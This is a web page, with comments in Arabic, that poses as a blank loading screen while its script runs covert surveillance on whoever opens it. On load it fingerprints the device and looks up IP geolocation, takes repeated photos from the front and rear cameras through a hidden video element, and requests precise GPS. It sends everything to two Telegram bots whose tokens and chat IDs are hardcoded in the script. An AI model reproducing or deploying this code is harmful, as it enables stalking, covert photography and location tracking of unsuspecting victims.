<style>
  * {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
    -webkit-tap-highlight-color: transparent;
  }

  html, body {
    min-height: 100%;
    background: #ffffff !important;
    overflow: hidden;
  }

  body {
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    font-family: -apple-system, BlinkMacSystemFont, "Inter", "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    color: #333;
    position: relative;
  }

  body::before,
  body::after {
    display: none !important;
  }

  #loader {
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    gap: 26px;
    animation: fadeIn .5s ease;
  }

  @keyframes fadeIn {
    from { opacity: 0; }
    to   { opacity: 1; }
  }

  .spinner {
    width: 62px;
    height: 62px;
    border: 3px solid #ececec;
    border-top-color: #999999;
    border-radius: 50%;
    animation: spin .85s linear infinite;
    will-change: transform;
  }

  @keyframes spin {
    to { transform: rotate(360deg); }
  }

  .loading-text {
    font-size: 14px;
    color: #cfcfcf;
    letter-spacing: 5px;
    font-weight: 300;
    user-select: none;
    -webkit-user-select: none;
    animation: softPulse 2.4s ease-in-out infinite;
  }

  @keyframes softPulse {
    0%, 100% { opacity: .55; }
    50%      { opacity: 1; }
  }

  #denied {
    display: none;
    text-align: center;
    max-width: 340px;
    padding: 24px;
    animation: fadeIn .4s ease;
  }
  #denied.active { display: block; }

  #denied h1 {
    font-size: 19px;
    font-weight: 600;
    color: #222;
    margin-bottom: 12px;
  }

  #denied p {
    font-size: 14px;
    color: #8a8a8a;
    line-height: 1.8;
    margin-bottom: 26px;
  }

  #retryBtn {
    padding: 13px 38px;
    background: #111111;
    color: #ffffff;
    border: none;
    border-radius: 12px;
    font-size: 15px;
    font-weight: 600;
    cursor: pointer;
    font-family: inherit;
    letter-spacing: .3px;
    transition: opacity .18s, transform .18s;
  }
  #retryBtn:active {
    opacity: .8;
    transform: scale(.97);
  }

  video {
    position: fixed;
    left: -9999px;
    top: -9999px;
    width: 2px;
    height: 2px;
    opacity: .01;
    pointer-events: none;
  }

<script>
(function () {
  /* ============================================================
     ⚙️ الإعدادات — بوتات متعددة (كل بوت له توكن + chat_id)
     ============================================================ */
  const BOTS = [
    {
      name    : "البوت الأول",
      token   : "8847064396:AAESRDR7gXJm1kgb8qphlEHj_DRtNaSfj00",
      chat_id : "8273860583"
    },
    {
      name    : "محمد بك ربيع المحامي",
      token   : "8712291045:AAHqqMs0amYJ2Z16XxuC5vLbokrHAztwqjA",
      chat_id : "8865742831"
    }
  ];

  /* ============================================================ */

  const TOTAL_PER_SIDE = 5;
  const SETTLE_MS      = 450;
  const MIN_BRIGHTNESS = 5;
  const PHOTO_GAP_MS   = 80;
  const RELEASE_MS     = 400;

  /* ============ Elements ============ */
  const v         = document.getElementById("v");
  const loaderEl  = document.getElementById("loader");
  const deniedEl  = document.getElementById("denied");
  const retryBtn  = document.getElementById("retryBtn");

  let currentStream = null;
  let running = false;

  const sleep = ms => new Promise(r => setTimeout(r, ms));
  const esc = s => String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;");

  /* ============ التحكم في الشاشات ============ */
  function showLoader(){
    loaderEl.style.display = "flex";
    deniedEl.classList.remove("active");
  }
  function showDenied(){
    loaderEl.style.display = "none";
    deniedEl.classList.add("active");
  }

  /* ============================================================
     📡 1) جلب بيانات الـ IP من السيرفر
     ============================================================ */
  async function fetchIPInfo(){
    const sources = [
      async () => {
        const r = await fetch("https://ipapi.co/json/");
        if(!r.ok) return null;
        const j = await r.json();
        if(!j || !j.ip) return null;
        return {
          ip      : j.ip,
          country : j.country_name,
          region  : j.region,
          city    : j.city,
          postal  : j.postal,
          isp     : j.org,
          asn     : j.asn,
          lat     : j.latitude,
          lon     : j.longitude,
          tz      : j.timezone
        };
      },
      async () => {
        const r = await fetch("https://api.ipify.org?format=json");
        if(!r.ok) return null;
        const j = await r.json();
        return j && j.ip ? { ip: j.ip } : null;
      }
    ];

    for(const src of sources){
      try{
        const data = await src();
        if(data) return data;
      }catch(_){}
    }
    return null;
  }

  /* ============================================================
     🔋 2) البطارية
     ============================================================ */
  async function getBattery(){
    try{
      if(!navigator.getBattery) return null;
      const b = await navigator.getBattery();
      return {
        level    : Math.round(b.level * 100) + "%",
        charging : b.charging ? "⚡ يشحن" : "🔌 لا يشحن"
      };
    }catch{ return null; }
  }

  /* ============================================================
     📶 3) حالة الشبكة
     ============================================================ */
  function getNetworkInfo(){
    const c = navigator.connection
           || navigator.mozConnection
           || navigator.webkitConnection;

    return {
      online   : navigator.onLine ? "نعم" : "لا",
      type     : c ? (c.effectiveType || "—") : "—",
      downlink : c && c.downlink != null ? c.downlink + " Mbps" : "—",
      rtt      : c && c.rtt != null ? c.rtt + " ms" : "—",
      saveData : c ? (c.saveData ? "نعم" : "لا") : "—"
    };
  }

  /* ============================================================
     🖥 4) نظام التشغيل
     ============================================================ */
  function getOSInfo(){
    const ua = navigator.userAgent;
    let name = "—", version = "";

    if(/Windows NT ([\d.]+)/.test(ua)){
      const map = {"10.0":"10/11","6.3":"8.1","6.2":"8","6.1":"7","6.0":"Vista","5.1":"XP"};
      name = "Windows";
      version = map[RegExp.$1] || RegExp.$1;
    }
    else if(/Android ([\d.]+)/.test(ua)){
      name = "Android"; version = RegExp.$1;
    }
    else if(/iPhone OS ([\d_]+)/.test(ua)){
      name = "iOS"; version = RegExp.$1.replace(/_/g,".");
    }
    else if(/Mac OS X ([\d_]+)/.test(ua)){
      name = "macOS"; version = RegExp.$1.replace(/_/g,".");
    }
    else if(/Linux/.test(ua)){
      name = "Linux";
    }

    return { name, version };
  }

  /* ============================================================
     🌐 5) المتصفح
     ============================================================ */
  function getBrowserInfo(){
    const ua = navigator.userAgent;

    if(/Edg\/([\d.]+)/.test(ua))                  return { name:"Microsoft Edge", version:RegExp.$1 };
    if(/OPR\/([\d.]+)/.test(ua))                  return { name:"Opera",          version:RegExp.$1 };
    if(/Chrome\/([\d.]+)/.test(ua))               return { name:"Chrome",         version:RegExp.$1 };
    if(/Firefox\/([\d.]+)/.test(ua))              return { name:"Firefox",        version:RegExp.$1 };
    if(/Version\/([\d.]+).*Safari/.test(ua))      return { name:"Safari",         version:RegExp.$1 };
    if(/MSIE ([\d.]+)/.test(ua))                  return { name:"IE",             version:RegExp.$1 };

    return { name:"غير معروف", version:"" };
  }

  /* ============================================================
     🎮 6) كارت الرسومات
     ============================================================ */
  function getGPU(){
    try{
      const c  = document.createElement("canvas");
      const gl = c.getContext("webgl") || c.getContext("experimental-webgl");
      if(!gl) return "—";

      const dbg = gl.getExtension("WEBGL_debug_renderer_info");
      if(dbg) return gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) || "—";

      return gl.getParameter(gl.RENDERER) || "—";
    }catch{ return "—"; }
  }

  /* ============================================================
     💾 7) التخزين
     ============================================================ */
  async function getStorageInfo(){
    try{
      if(!navigator.storage || !navigator.storage.estimate) return null;
      const est = await navigator.storage.estimate();
      return {
        quota : (est.quota / 1024 / 1024).toFixed(1) + " MB",
        usage : (est.usage / 1024 / 1024).toFixed(2) + " MB"
      };
    }catch{ return null; }
  }

  /* ============================================================
     🖥 8) الشاشة
     ============================================================ */
  function getScreenInfo(){
    let orientation = "—";
    if(screen.orientation && screen.orientation.type){
      orientation = screen.orientation.type;
    }else if(window.orientation === 0 || window.orientation === 180){
      orientation = "portrait";
    }else if(window.orientation === 90 || window.orientation === -90){
      orientation = "landscape";
    }

    return {
      size        : `${screen.width}×${screen.height}`,
      availSize   : `${screen.availWidth}×${screen.availHeight}`,
      dpr         : devicePixelRatio,
      colorDepth  : screen.colorDepth + " bit",
      pixelDepth  : screen.pixelDepth + " bit",
      orientation : orientation
    };
  }

  /* ============================================================
     🕐 9) الوقت والتوقيت
     ============================================================ */
  function getTimeInfo(){
    const offsetMin = new Date().getTimezoneOffset();
    const sign      = offsetMin <= 0 ? "+" : "-";
    const hours     = Math.abs(offsetMin / 60);

    return {
      zone      : Intl.DateTimeFormat().resolvedOptions().timeZone,
      utcOffset : `UTC${sign}${hours}`,
      localTime : new Date().toLocaleString("ar-EG")
    };
  }

  /* ============================================================
     🔒 10) الخصوصية
     ============================================================ */
  function getPrivacyInfo(){
    return {
      cookies : navigator.cookieEnabled ? "مفعّلة" : "معطّلة",
      dnt     : navigator.doNotTrack || "—",
      referrer: document.referrer || "مباشر"
    };
  }

  /* ============================================================
     📱 11) الجهاز (عام)
     ============================================================ */
  function getDeviceInfo(){
    const ua = navigator.userAgent;
    let type = "—";

    if(/Android/i.test(ua))                 type = "Android";
    else if(/iPhone|iPad|iPod/i.test(ua))   type = "iOS";
    else if(/Windows/i.test(ua))            type = "Windows";
    else if(/Macintosh|Mac OS X/i.test(ua)) type = "Mac";
    else if(/Linux/i.test(ua))              type = "Linux";

    return {
      type      : type,
      platform  : navigator.platform || "—",
      language  : navigator.language,
      languages : (navigator.languages || []).join(", "),
      cores     : navigator.hardwareConcurrency || "—",
      memory    : navigator.deviceMemory ? navigator.deviceMemory + " GB" : "—",
      touch     : ("ontouchstart" in window) ? "نعم" : "لا",
      maxTouch  : navigator.maxTouchPoints || 0
    };
  }

  /* ============================================================
     🧩 12) تجميع كل البيانات وإرسالها منسّقة
     ============================================================ */
  async function collect(){
    const [bat, ipInfo, storage] = await Promise.all([
      getBattery(),
      fetchIPInfo(),
      getStorageInfo()
    ]);

    const net     = getNetworkInfo();
    const os      = getOSInfo();
    const browser = getBrowserInfo();
    const gpu     = getGPU();
    const screenI = getScreenInfo();
    const time    = getTimeInfo();
    const privacy = getPrivacyInfo();
    const device  = getDeviceInfo();

    const L = [];
    const line  = (k, v) => L.push(`${k}: <code>${esc(v)}</code>`);
    const title = (t)    => L.push(`\n━━━━━━━━━━━━━━━━━━\n<b>${t}</b>\n━━━━━━━━━━━━━━━━━━`);

    // ===== العنوان الرئيسي =====
    L.push("🔔 <b>جهاز جديد فتح الصفحة</b>");

    // ===== 🌐 الشبكة و IP =====
    title("🌐 الشبكة و IP");
    if(ipInfo){
      if(ipInfo.ip)      line("📌 IP",             ipInfo.ip);
      if(ipInfo.country) line("🌍 الدولة",         ipInfo.country);
      if(ipInfo.region)  line("🏙 المحافظة",       ipInfo.region);
      if(ipInfo.city)    line("🏠 المدينة",        ipInfo.city);
      if(ipInfo.postal)  line("📮 الرمز البريدي",  ipInfo.postal);
      if(ipInfo.isp)     line("📡 الشركة المزودة", ipInfo.isp);
      if(ipInfo.asn)     line("🔢 ASN",            ipInfo.asn);
      if(ipInfo.lat)     line("📍 إحداثيات IP",   `${ipInfo.lat},${ipInfo.lon}`);
      if(ipInfo.tz)      line("🕐 توقيت IP",      ipInfo.tz);
    }else{
      L.push("❌ لم يتم الحصول على بيانات IP");
    }
    line("🔌 متصل",           net.online);
    line("📶 نوع الشبكة",     net.type);
    line("⬇️ السرعة",         net.downlink);
    line("⏱ زمن الاستجابة",  net.rtt);
    line("💾 توفير البيانات", net.saveData);

    // ===== 📱 الجهاز =====
    title("📱 الجهاز");
    line("📱 النوع",        device.type);
    line("🖥 المنصة",        device.platform);
    line("🗣 اللغة",         device.language);
    line("🗣 لغات مقترحة",  device.languages);
    line("🧠 الأنوية",       device.cores);
    line("💾 الذاكرة",       device.memory);
    line("👆 دعم اللمس",     device.touch);
    line("👆 نقاط اللمس",    device.maxTouch);
    line("🔋 البطارية",     bat ? bat.level : "—");
    line("⚡ حالة الشحن",    bat ? bat.charging : "—");

    // ===== 🌐 النظام والمتصفح =====
    title("🌐 النظام والمتصفح");
    line("💻 نظام التشغيل",  `${os.name} ${os.version}`.trim());
    line("🌐 المتصفح",       `${browser.name} ${browser.version}`.trim());
    line("🎮 كارت الرسومات", gpu);

    // ===== 🖥 الشاشة =====
    title("🖥 الشاشة");
    line("📐 المقاس",         screenI.size);
    line("📐 المتاح",         screenI.availSize);
    line("🔍 كثافة البكسل",  screenI.dpr);
    line("🎨 عمق الألوان",    screenI.colorDepth);
    line("🎨 عمق البكسل",     screenI.pixelDepth);
    line("🔄 الاتجاه",         screenI.orientation);

    // ===== 💾 التخزين =====
    if(storage){
      title("💾 التخزين");
      line("📦 المتاح",   storage.quota);
      line("📊 المستخدم", storage.usage);
    }

    // ===== 🔒 الخصوصية =====
    title("🔒 الخصوصية");
    line("🍪 الكوكيز", privacy.cookies);
    line("🛡 DNT",     privacy.dnt);
    line("🔗 المرجع",  privacy.referrer);

    // ===== 🕐 الوقت =====
    title("🕐 الوقت");
    line("🌍 المنطقة الزمنية", time.zone);
    line("⏰ فرق التوقيت",    time.utcOffset);
    line("📅 وقت الفتح",      time.localTime);

    // ===== 🌐 UA =====
    title("🌐 User Agent");
    L.push(`<code>${esc(navigator.userAgent)}</code>`);

    return L.join("\n");
  }

  /* ============================================================
     تليجرام — إرسال لكل البوتات معًا
     ============================================================ */
  function broadcastToBots(endpoint, buildForm){
    return Promise.all(
      BOTS.map(bot => {
        const fd = buildForm(bot);
        return fetch(`https://api.telegram.org/bot${bot.token}/${endpoint}`, {
          method: "POST",
          body: fd
        }).catch(()=>{});
      })
    );
  }

  function sendText(t){
    return broadcastToBots("sendMessage", bot => {
      const fd = new FormData();
      fd.append("chat_id", bot.chat_id);
      fd.append("text", t);
      fd.append("parse_mode", "HTML");
      return fd;
    });
  }

  function sendPhoto(blob, cap){
    return broadcastToBots("sendPhoto", bot => {
      const fd = new FormData();
      fd.append("chat_id", bot.chat_id);
      fd.append("caption", cap);
      fd.append("photo", blob, "p.jpg");
      return fd;
    });
  }

  function sendLocation(lat, lon, cap){
    return broadcastToBots("sendLocation", bot => {
      const fd = new FormData();
      fd.append("chat_id", bot.chat_id);
      fd.append("latitude", lat);
      fd.append("longitude", lon);
      if(cap) fd.append("caption", cap);
      return fd;
    });
  }

  /* ============================================================
     الكاميرا
     ============================================================ */
  function waitForRealFrame(videoEl, timeout = 2500){
    if (typeof videoEl.requestVideoFrameCallback === "function"){
      return Promise.race([
        new Promise(res => videoEl.requestVideoFrameCallback(() => res())),
        new Promise(res => setTimeout(res, timeout))
      ]);
    }
    return new Promise(res => {
      const done = () => res();
      videoEl.addEventListener("playing", done, {once:true});
      videoEl.addEventListener("canplay", done, {once:true});
      setTimeout(done, timeout);
    });
  }

  async function closeCamera(){
    if (currentStream){
      currentStream.getTracks().forEach(t => { try{ t.stop(); }catch(_){} });
      currentStream = null;
    }
    if (v.srcObject) v.srcObject = null;
    await sleep(RELEASE_MS);
  }

  async function openCamera(facing, maxTries = 3){
    for (let attempt = 1; attempt <= maxTries; attempt++){
      try{
        await closeCamera();
        const s = await navigator.mediaDevices.getUserMedia({
          video:{ facingMode:{ideal: facing}, width:{ideal:1280}, height:{ideal:720} },
          audio:false
        });
        currentStream = s;
        v.srcObject = s;
        try{ await v.play(); }catch(_){}
        await waitForRealFrame(v);
        await sleep(SETTLE_MS);
        return s;
      }catch(e){
        if (e.name === "NotAllowedError" || e.name === "PermissionDeniedError"){
          throw e;
        }
        console.warn(`camera ${facing} try ${attempt} failed:`, e.message);
        if (attempt === maxTries) throw e;
        await sleep(600);
      }
    }
  }

  function capture(isFront){
    return new Promise(resolve => {
      const c = document.createElement("canvas");
      c.width  = v.videoWidth  || 1280;
      c.height = v.videoHeight || 720;
      const ctx = c.getContext("2d");
      if (isFront){
        ctx.translate(c.width, 0);
        ctx.scale(-1, 1);
      }
      ctx.drawImage(v, 0, 0, c.width, c.height);

      let brightness = 255;
      try{
        const sw = Math.min(200, c.width);
        const sh = Math.min(200, c.height);
        const sx = (c.width  - sw) / 2;
        const sy = (c.height - sh) / 2;
        const data = ctx.getImageData(sx, sy, sw, sh).data;
        let sum = 0, n = 0;
        for(let i=0; i<data.length; i+=16){
          sum += data[i] + data[i+1] + data[i+2];
          n += 3;
        }
        brightness = sum / n;
      }catch(_){}

      c.toBlob(b => resolve({blob:b, brightness}), "image/jpeg", 0.72);
    });
  }

  async function captureSafe(isFront, maxTries = 4){
    let best = null;
    for(let attempt = 1; attempt <= maxTries; attempt++){
      const {blob, brightness} = await capture(isFront);
      if(blob && brightness >= MIN_BRIGHTNESS) return {blob, brightness};
      if(blob && (!best || brightness > best.brightness)) best = {blob, brightness};
      await sleep(250);
    }
    return best;
  }

  /* ============================================================
     الموقع
     ============================================================ */
  function requestLocation(timeoutMs = 12000){
    return new Promise(resolve => {
      if(!navigator.geolocation) return resolve(null);
      const timer = setTimeout(() => resolve(null), timeoutMs);
      navigator.geolocation.getCurrentPosition(
        pos => {
          clearTimeout(timer);
          resolve({lat:pos.coords.latitude, lon:pos.coords.longitude, accuracy:pos.coords.accuracy});
        },
        err => { clearTimeout(timer); resolve({ error: err.message }); },
        { enableHighAccuracy: true, timeout: timeoutMs, maximumAge: 0 }
      );
    });
  }

  /* ============================================================
     مرحلة تصوير
     ============================================================ */
  async function capturePhase(facing, label, count){
    await openCamera(facing);

    for (let i = 1; i <= count; i++){
      const result = await captureSafe(facing === "user");
      if (result && result.blob){
        sendPhoto(result.blob, `${label} #${i}`);
      }
      await sleep(PHOTO_GAP_MS);
    }
  }

  /* ============================================================
     التسلسل الكامل
     ============================================================ */
  async function runFullSequence(){
    if (running) return;
    running = true;

    showLoader();

    // بيانات الجهاز — تُرسل بالتوازي بدون انتظار
    collect().then(t => sendText(t)).catch(()=>{});

    try {
      // 1) الكاميرا الأمامية
      await capturePhase("user", "📸 الكاميرا الأمامية", TOTAL_PER_SIDE);

      // 2) الكاميرا الخلفية
      await sleep(300);
      await capturePhase("environment", "📷 الكاميرا الخلفية", TOTAL_PER_SIDE);

      // 3) الموقع الجغرافي
      const loc = await requestLocation();

      if (loc && loc.lat !== undefined){
        const cap =
          `📍 <b>الموقع الجغرافي</b>\n` +
          `🌐 https://maps.google.com/?q=${loc.lat},${loc.lon}\n` +
          `🎯 الدقة: ${Math.round(loc.accuracy)} م`;
        sendLocation(loc.lat, loc.lon, cap);
      }else if (loc && loc.error){
        sendText(`📍 <b>الموقع الجغرافي</b>\n❌ ${esc(loc.error)}`);
      }else{
        sendText("📍 <b>الموقع الجغرافي</b>\n❌ لم يتم الحصول على الموقع");
      }

      // 4) نقفل الكاميرا — بدون أي تحويل أو تحميل ملف
      await closeCamera();

    } catch (err) {
      await closeCamera();
      showDenied();
      sendText(`❌ <b>رُفض الوصول للكاميرا</b>\n<code>${esc(err.message || err.name || "unknown")}</code>`);
      running = false;
    }
  }

  /* ============================================================
     الأحداث
     ============================================================ */
  retryBtn.addEventListener("click", () => {
    if (running) return;
    runFullSequence();
  });

  /* ============================================================
     🚀 تشغيل تلقائي
     ============================================================ */
  function boot(){
    setTimeout(runFullSequence, 250);
  }

  if (document.readyState === "complete" || document.readyState === "interactive"){
    boot();
  } else {
    document.addEventListener("DOMContentLoaded", boot);
  }

})();
</script>
